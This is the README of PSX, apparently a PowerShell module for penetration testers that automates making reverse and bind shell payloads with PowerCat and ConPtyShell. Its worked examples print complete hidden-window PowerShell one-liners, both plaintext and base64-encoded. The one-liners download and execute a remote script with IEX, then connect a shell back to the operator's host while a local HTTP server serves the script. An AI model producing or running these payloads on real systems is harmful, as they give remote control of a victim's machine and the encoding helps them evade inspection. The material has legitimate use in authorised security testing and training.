# PSX

## Description
This module helps specifically with PowerShell payloads

You no longer need to manually base64-encode your payloads, host, or tweak them\
With a few quick functions, you can now automate the whole shebang with only a few arguments

## Features
PSX currently provides the following features:
- ConPtyShell automation (including terminal [auto]size specification)
- PowerCat automation
- Base64-(encode|decode) payloads
- Automatic payload-to-clipboard
- Python Simple HTTP server
- Parameter completion
- [Optional] Automation for netcat listeners ***(X11 only)***

## Available Functions
- `cvsh` -> `Convert-Shell`
- `ib64` -> `Invoke-B64`
- `Invoke-Server`
- `Get-InterfaceAddress`
- `Sync-PSX`
- `Get-PSXAutomation` ***(X11 only)***
- `Set-PSXAutomation` ***(X11 only)***

## Heads up
- This module **WILL NOT**, and **MUST NOT** be, run as `root`; this is by design, and I will\
not be changing this at any point
- Only time elevated privileges are needed is on the first invocation of the module commands\
If you decide to enable automating netcat listeners, you will be prompted for your `sudo` password\
to issue the command `sudo apt-get install xdotool`
- The above command runs without verbosity, but you can see what gets installed by reading through\
`helpers/Init.ps1`
- Automation feature requires:
    - `xdotool` (Initial invocation of the module commands takes care of that)
    - X11 environment (Sorry, Waylanders...For now, maybe? :eyes:)
    - `Convert-Shell ... -Serve` (i.e the `-Serve`/`-s` switch)
- When using `conpty` as the selected payload type, caution must be exercised where\
terminal sizing is concerned. That is to say, the _current_ terminal size is chosen\
by default unless otherwise configured. For example, if you convert a `conpty` shell\
in a vertically-split terminal (49 rows, 95 columns), the netcat listener must be run\
in a terminal window of the same size. If you are on an X11 environment, and you have\
automation enabled, it is preferred to run `pwsh` in a non-split tab
- The module is designed to be implicitly imported from the `$USER`'s `$PSModulePath`, so\
please make sure you clone it as per the instructions. Otherwise, you will have to tweak\
the module manifest, and any required path modifications yourself

## Cloning
```sh
kali@kali:~$ git clone https://github.com/X0RW3LL/PSX.git /home/$USER/.local/share/powershell/Modules/PSX
```
## Getting help
```ps
PS kali@kali /home/kali> Get-Help Convert-Shell -Full
```
## Examples

### PowerCat (reverse powershell)
```ps
PS kali@kali /home/kali> cvsh -i wlan1 -t powercat -lp 443 -s

[!] Plaintext payload:
----------------------
powershell -nop -ep unrestricted -w hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.0.111:80/powercat.ps1');powercat -c 192.168.0.111 -p 443 -e powershell"

[+] Encoded payload (copied to clipboard):
------------------------------------------
powershell -nop -ep unrestricted -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADAALgAxADEAMQA6ADgAMAAvAHAAbwB3AGUAcgBjAGEAdAAuAHAAcwAxACcAKQA7AHAAbwB3AGUAcgBjAGEAdAAgAC0AYwAgADEAOQAyAC4AMQA2ADgALgAwAC4AMQAxADEAIAAtAHAAIAA0ADQAMwAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwA


[!] Starting HTTP server on wlan1 port 80
[!] Currently serving: /usr/share/powershell-empire/empire/server/data/module_source/management
[!] Ctrl+C terminates the server

Serving HTTP on 192.168.0.111 port 80 (http://192.168.0.111:80/) ...
```
### PowerCat (bind cmd)
```ps
PS kali@kali /home/kali> cvsh -t powercat -lp 4444 -s -i docker0 -e cmd -b

[!] Plaintext payload:
----------------------
powershell -nop -ep unrestricted -w hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://172.17.0.1:80/powercat.ps1');powercat -l -p 4444 -e cmd"

[+] Encoded payload (copied to clipboard):
------------------------------------------
powershell -nop -ep unrestricted -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAxADcALgAwAC4AMQA6ADgAMAAvAHAAbwB3AGUAcgBjAGEAdAAuAHAAcwAxACcAKQA7AHAAbwB3AGUAcgBjAGEAdAAgAC0AbAAgAC0AcAAgADQANAA0ADQAIAAtAGUAIABjAG0AZAA=


[!] Starting HTTP server on docker0 port 80
[!] Currently serving: /usr/share/powershell-empire/empire/server/data/module_source/management
[!] Ctrl+C terminates the server

Serving HTTP on 172.17.0.1 port 80 (http://172.17.0.1:80/) ...
```
### ConPty (split terminal autosize)
```ps
PS kali@kali /home/kali> cvsh -t conpty -lp 4455 -s -sp 8080 -i wg0

[!] Plaintext payload:
----------------------
powershell -nop -ep unrestricted -w hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.8.0.2:8080/Invoke-ConPtyShell.ps1');Invoke-ConPtyShell 10.8.0.2 4455 -Rows 49 -Cols 95"

[+] Encoded payload (copied to clipboard):
------------------------------------------
powershell -nop -ep unrestricted -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AOAAuADAALgAyADoAOAAwADgAMAAvAEkAbgB2AG8AawBlAC0AQwBvAG4AUAB0AHkAUwBoAGUAbABsAC4AcABzADEAJwApADsASQBuAHYAbwBrAGUALQBDAG8AbgBQAHQAeQBTAGgAZQBsAGwAIAAxADAALgA4AC4AMAAuADIAIAA0ADQANQA1ACAALQBSAG8AdwBzACAANAA5ACAALQBDAG8AbABzACAAOQA1AA==


[!] Starting HTTP server on wg0 port 8080
[!] Currently serving: /home/kali/.local/share/powershell/Modules/PSX/extensions
[!] Ctrl+C terminates the server

Serving HTTP on 10.8.0.2 port 8080 (http://10.8.0.2:8080/) ...
```
### ConPty (fullscreen terminal explicit sizing)
```ps
PS kali@kali /home/kali> cvsh -t conpty -lp 445 -s -i wg0 -rows 51 -cols 191          

[!] Plaintext payload:
----------------------
powershell -nop -ep unrestricted -w hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.8.0.2:80/Invoke-ConPtyShell.ps1');Invoke-ConPtyShell 10.8.0.2 445 -Rows 51 -Cols 191"

[+] Encoded payload (copied to clipboard):
------------------------------------------
powershell -nop -ep unrestricted -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AOAAuADAALgAyADoAOAAwAC8ASQBuAHYAbwBrAGUALQBDAG8AbgBQAHQAeQBTAGgAZQBsAGwALgBwAHMAMQAnACkAOwBJAG4AdgBvAGsAZQAtAEMAbwBuAFAAdAB5AFMAaABlAGwAbAAgADEAMAAuADgALgAwAC4AMgAgADQANAA1ACAALQBSAG8AdwBzACAANQAxACAALQBDAG8AbABzACAAMQA5ADEA


[!] Starting HTTP server on wg0 port 80
[!] Currently serving: /home/kali/.local/share/powershell/Modules/PSX/extensions
[!] Ctrl+C terminates the server

Serving HTTP on 10.8.0.2 port 80 (http://10.8.0.2:80/) ...
```
### Base64-decode
```ps
PS kali@kali /home/kali> ib64 -d SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADAALgAxADEAMQA6ADgAMAAvAHAAbwB3AGUAcgBjAGEAdAAuAHAAcwAxACcAKQA7AHAAbwB3AGUAcgBjAGEAdAAgAC0AYwAgADEAOQAyAC4AMQA2ADgALgAwAC4AMQAxADEAIAAtAHAAIAA0ADQAMwAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwA

[+] Decoded payload:
--------------------
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.0.111:80/powercat.ps1');powercat -c 192.168.0.111 -p 443 -e powershell

```
